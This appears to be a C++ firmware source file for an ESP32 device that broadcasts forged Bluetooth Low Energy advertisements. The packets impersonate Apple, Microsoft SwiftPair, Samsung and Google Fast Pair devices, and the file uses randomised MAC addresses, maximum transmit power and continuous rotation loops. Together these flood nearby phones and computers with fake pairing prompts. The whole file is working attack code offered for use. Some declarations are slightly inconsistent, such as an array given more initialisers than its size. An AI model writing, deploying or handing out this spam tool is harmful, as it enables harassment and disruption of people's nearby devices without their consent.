#include "core/mykeyboard.h"
#include <globals.h>
#include "ble_spam.h"
#include <vector>

// Define the namespace for BLE Spam functionalities
namespace BLESpam {

struct BLEData {
    BLEAdvertisementData AdvData;
    BLEAdvertisementData ScanData;
};

enum class BLEChoice {
    CHOICE_1 = 1,
    CHOICE_2,
    CHOICE_3,
    // Add more choices as needed
};

struct WatchModel {
    uint8_t value;
};

struct mac_addr {
    unsigned char bytes[6];
};

struct Station {
    uint8_t mac[6];
    bool selected;
};

enum EBLEPayloadType {
    Microsoft,
    Apple,
    Samsung,
    Google
};

const uint8_t IOS1[] = {
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
};

const uint8_t IOS2[] = {
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24
};

const WatchModel watch_models[26] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09},
    {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15}, {0x16}, {0x17},
    {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
};

// Function to generate a random MAC address
void generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
        if (i == 0) {
            mac[i] |= 0xF0;  // Ensure the first 4 bits are high
        }
    }
}

// Function to get advertisement data based on device type
BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
        case Microsoft: {
            const char* Name = generateRandomName();
            uint8_t name_len = strlen(Name);
            AdvData_Raw = new uint8_t[7 + name_len];
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
            AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
            break;
        }
        case Apple: {
            int rand = random(3);
            if (rand == 0) {
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)], 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 31));
            } else if (rand == 1) {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)], 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 23));
            } else {
                uint8_t packet[17];
                uint8_t i = 0;
                packet[i++] = 16;   // Packet Length
                packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
                packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
                packet[i++] = 0x00; // ...
                packet[i++] = 0x0F; // Type
                packet[i++] = 0x05; // Length
                packet[i++] = 0xC1; // Action Flags
                const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
                packet[i++] = types[random() % sizeof(types)];  // Action Type
                esp_fill_random(&packet[i], 3);              // Authentication Tag
                i += 3;
                packet[i++] = 0x00; // ???
                packet[i++] = 0x00; // ???
                packet[i++] = 0x10; // Type ???
                esp_fill_random(&packet[i], 3);
                AdvData.addData(std::string((char *)packet, 17));
            }
            break;
        }
        case Samsung: {
            uint8_t model = watch_models[random(26)].value;
            uint8_t Samsung_Data[15] = {0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (uint8_t)((model >> 0x00) & 0xFF)};
            AdvData.addData(std::string((char *)Samsung_Data, 15));
            break;
        }
        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
            uint8_t Google_Data[14] = {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, (uint8_t)((model >> 0x10) & 0xFF), (uint8_t)((model >> 0x08) & 0xFF), (uint8_t)((model >> 0x00) & 0xFF), 0x02, 0x0A, (uint8_t)((rand() % 120) - 100)};
            AdvData.addData(std::string((char *)Google_Data, 14));
            break;
        }
        default: {
            Serial.println("Please Provide a Company Type");
            break;
        }
    }
    delete[] AdvData_Raw;
    return AdvData;
}

// Function to execute spam based on payload type
void executeSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    BLEDevice::init("");
    delay(1);  // Reduced delay before setting TX power
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
    NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
    pAdvertising->addServiceUUID(uuid);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(oScanResponseData);
    pAdvertising->start();
    delay(1);  // Reduced delay for advertisement period

    pAdvertising->stop();
    delay(1);  // Reduced delay before deinitializing
    BLEDevice::deinit();
}

// Function to execute custom spam with rotation
void executeCustomSpamWithRotation(int rotationInterval) {
    EBLEPayloadType types[] = {Apple, Microsoft, Samsung, Google};
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    while (true) {
        EBLEPayloadType randomType = types[random(0, sizeof(types) / sizeof(types[0]))];
        executeSpam(randomType);

        delay(rotationInterval);

        if (check(EscPress)) {
            break;
        }
    }
}

// Function to handle advertisement based on BLE choice
void aj_adv(int ble_choice) {
    int timer = 0;
    int count = 0;
    String spamName = "";
    if (ble_choice == 5) {
        spamName = keyboard("", 10, "Name to spam");
    }
    timer = millis();
    while (true) {
        if (millis() - timer > 100) {
            switch (ble_choice) {
                case 0: // Applejuice
                    displayTextLine("iOS Spam (" + String(count) + ")");
                    executeSpam(Apple);
                    break;
                case 1: // SwiftPair
                    displayTextLine("SwiftPair  (" + String(count) + ")");
                    executeSpam(Microsoft);
                    break;
                case 2: // Samsung
                    displayTextLine("Samsung  (" + String(count) + ")");
                    executeSpam(Samsung);
                    break;
                case 3: // Android
                    displayTextLine("Android  (" + String(count) + ")");
                    executeSpam(Google);
                    break;
                case 4: // Tutti-frutti
                    displayTextLine("Spam All  (" + String(count) + ")");
                    executeCustomSpamWithRotation(500);  // Rotate every 500ms (configurable)
                    break;
                case 5: // Custom
                    displayTextLine("Spamming " + spamName +  "(" + String(count) + ")");
                    executeCustomSpam(spamName);
            }
            count++;
            timer = millis();
        }

        if (check(EscPress)) {
            returnToMenu = true;
            break;
        }
    }

    BLEDevice::init("");
    delay(100);
    BLEAdvertising *pAdvertising = nullptr;
    delay(100);
    BLEDevice::deinit();
}

} // namespace BLESpam
